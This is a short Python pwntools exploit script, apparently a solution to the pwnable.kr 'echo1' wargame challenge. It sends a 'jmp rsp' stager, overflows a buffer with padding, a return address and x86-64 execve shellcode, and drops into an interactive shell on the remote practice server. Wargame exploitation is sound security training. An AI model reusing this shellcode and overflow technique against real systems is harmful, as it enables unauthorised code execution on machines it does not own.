#!/usr/bin/env python
# -*- coding: UTF-8 -*-
# Auth0r : afang
# nice day mua! :P
# desc:

# imports

from pwn import *
import time
context.log_level = "debug"
context.arch = "amd64"
shellcode = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
#p = process("./echo1")
p = remote("pwnable.kr", 9010)
print p.recvuntil("? : ")

start = 0x4006b0
jmp_rsp = asm("jmp rsp")

p.sendline(jmp_rsp) #stager1.
print p.recvuntil("> ")
raw_input("wait here.")
p.sendline("1")
time.sleep(0.3)
print p.recv()

call_r12 = 0x400ae9
ppr_ebx = 0x400761
clean_up = 0x40089c
offset = "a" * 40
jmp_loc = 0x6020a0
nop = 0x90
p.sendline(offset + p64(jmp_loc) + shellcode.ljust(40, "\x90"))
p.interactive()
